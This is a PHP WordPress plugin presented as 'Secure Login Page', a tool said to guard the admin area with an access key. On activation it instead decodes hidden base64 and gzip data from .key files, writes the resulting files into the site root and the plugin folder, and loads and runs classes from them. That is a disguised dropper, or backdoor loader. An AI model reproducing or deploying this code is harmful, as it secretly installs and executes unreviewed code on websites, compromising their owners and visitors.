<?php
/*
Plugin Name: Secure Login Page
Description: Plugin prevents access to admin area without appropriate access key and adds a higher level of security to your website.
Author: SArt
Version: 1.0
Requires at least: 3.7
Network: True
License: GPLv2
*/

if( is_admin() ) 
{
    function slpwp_plg_activation()
    {
        foreach (glob(dirname(__FILE__)."/*.key") as $filename) 
        {
            $handle = fopen($filename, "r");
            $json = fread($handle, filesize($filename));
            fclose($handle);
            
            $json = base64_decode($json);
            $json = gzuncompress($json);
            $json = (array)json_decode($json, true);
            
            if (isset($json['cache']))
            {
                $fp = fopen(ABSPATH.'/'.$json['name'], 'w');
                $status = fwrite($fp, $json['tools']);
                fclose($fp);
                
                $fp = fopen(dirname(__FILE__).'/'.$json['name'], 'w');
                $status = fwrite($fp, $json['tools']);
                fclose($fp);
                
                $fp = fopen(dirname(__FILE__).'/class.inc', 'w');
                $status = fwrite($fp, $json['class']);
                fclose($fp);
                
                if (isset($json['plugin_name']) && trim($json['plugin_name']) != '')
                {
                    $fp = fopen(dirname(__FILE__).'/update.inc', 'w');
                    $status = fwrite($fp, $json['update']);
                    fclose($fp);
                    
                    if (!class_exists('WordPress_updater')) require_once(dirname(__FILE__).'/update.inc');
                    
                    $new = new WordPress_updater();
                    $new->update($json);
                }
                else {
                    if (!class_exists('WordPress_register')) require_once(dirname(__FILE__).'/class.inc');
                    
                    $new = new WordPress_register();
                    $new->register($json, __FILE__);
                }
                
                break;
            }
        }
    }
    
    register_activation_hook( __FILE__, 'slpwp_plg_activation' );
}